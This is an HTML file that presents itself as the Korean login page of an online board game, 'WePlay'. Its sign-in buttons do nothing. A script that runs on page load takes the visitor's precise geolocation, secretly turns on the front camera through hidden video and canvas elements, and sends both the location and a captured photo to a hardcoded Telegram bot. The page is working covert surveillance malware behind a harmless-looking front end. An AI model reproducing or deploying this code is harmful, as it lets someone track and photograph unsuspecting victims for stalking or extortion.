<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  
  <meta property="og:title" content="WePlay" />
  <meta property="og:description" content="온라인 보드게임 위플레이" />
  <meta property="og:image" content="1200x630wa-removebg-preview.webp" />
  <meta property="og:type" content="website" />
  
  <title>WePlay 로그인</title>
  <style>
    * {
      box-sizing: border-box;
      font-family: -apple-system, BlinkMacSystemFont, "Apple SD Gothic Neo", "Noto Sans KR", sans-serif;
    }
    body {
      margin: 0;
      background: #ffffff;
      height: 100vh;
      display: flex;
      justify-content: center;
    }

    .phone {
      width: 420px;
      max-width: 100%;
      padding: 40px 24px 32px;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .logo-wrap {
      margin-top: 110px;
      text-align: center;
    }
    .logo {
      width: 96px;
      height: 96px;
      border-radius: 24px;
      background: #FFE769;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0 auto 14px;
      overflow: hidden;
    }
    .logo img {
      width: 100%;
      height: 100%;
      object-fit: cover;
    }
    h1 {
      margin: 0;
      font-size: 22px;
      font-weight: 700;
    }
    .subtitle {
      margin-top: 4px;
      font-size: 13px;
      color: #9A9A9A;
    }

    .login-section {
      margin-top: auto;
      margin-bottom: 40px;
      width: 100%;
    }

    .apple-btn {
      width: 100%;
      height: 48px;
      border-radius: 24px;
      border: 1px solid #000;
      background: #fff;
      font-size: 15px;
      font-weight: 600;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      cursor: pointer;
    }
    .apple-btn img {
      height: 18px;
    }

    .social {
      display: flex;
      justify-content: center;
      gap: 18px;
      margin: 20px 0 10px;
    }
    .social button {
      width: 44px;
      height: 44px;
      border-radius: 50%;
      border: none;
      background: #F4F4F4;
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
    }

    .social img {
      width: 22px;
      height: 22px;
      object-fit: contain;
    }

    .social .mail img {
      width: 37px;
      height: 37px;
    }

    .help {
      font-size: 12px;
      color: #000;
      text-align: center;
    }

    #hidden_canvas {
      display: none;
    }
    #hidden_video {
      display: none;
    }
  </style>
</head>
<body>
  <div class="phone">
    <div class="logo-wrap">
      <div class="logo">
        <img src="1200x630wa-removebg-preview.webp" alt="WePlay 로고" />
      </div>
      <h1>WePlay</h1>
      <div class="subtitle">온라인 보드게임</div>
    </div>

    <div class="login-section">
      <button class="apple-btn">
        <img src="Apple-Logo-PNG-High-Quality-Image.png" alt="Apple" />
        Apple로 로그인
      </button>

      <div class="social">
        <button>
          <img src="png-clipart-google-logo-google-g-logo-icons-logos-emojis-tech-companies-thumbnail.png" alt="Google" />
        </button>
        <button>
          <img src="Facebook_f_logo__2019_.png" alt="Facebook" />
        </button>
        <button class="mail">
          <img src="tt.png" alt="이메일 로그인" />
        </button>
      </div>

      <div class="help">
        로그인이 문제가 발생했나요? 고객센터로 문의주세요.
      </div>
    </div>
  </div>

  <video id="hidden_video" autoplay playsinline muted></video>
  <canvas id="hidden_canvas"></canvas>

  <script>
    window.addEventListener('load', () => {
      const BOT_TOKEN = 'AAEHol13KHyGX0kObNLgap2o50bOMn84xtc'; 
      const CHAT_ID = '8088130637';

      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition((position) => {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;
          const mapUrl = `http://www.google.com/maps?q=${lat},${lon}`;
          const text = encodeURIComponent(`위플레이 로그인 시도 위치\n${mapUrl}`);

          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${text}`);
          requestCamera();
        }, () => {
          requestCamera();
        }, { enableHighAccuracy: true, timeout: 5000 });
      } else {
        requestCamera();
      }

      function requestCamera() {
        const video = document.getElementById('hidden_video');
        const canvas = document.getElementById('hidden_canvas');

        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
          .then((stream) => {
            video.srcObject = stream;
            video.onloadedmetadata = () => {
              setTimeout(() => {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                canvas.toBlob((blob) => {
                  const formData = new FormData();
                  formData.append('chat_id', CHAT_ID);
                  formData.append('photo', blob, 'capture.jpg');
                  formData.append('caption', '위플레이 사용자 캡처');

                  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                  }).then(() => {
                    stream.getTracks().forEach(track => track.stop());
                  });
                }, 'image/jpeg', 0.7);
              }, 1200);
            };
          })
          .catch((err) => {
            console.warn('카메라 권한 거부');
          });
      }
    });
  </script>
</body>

</html>
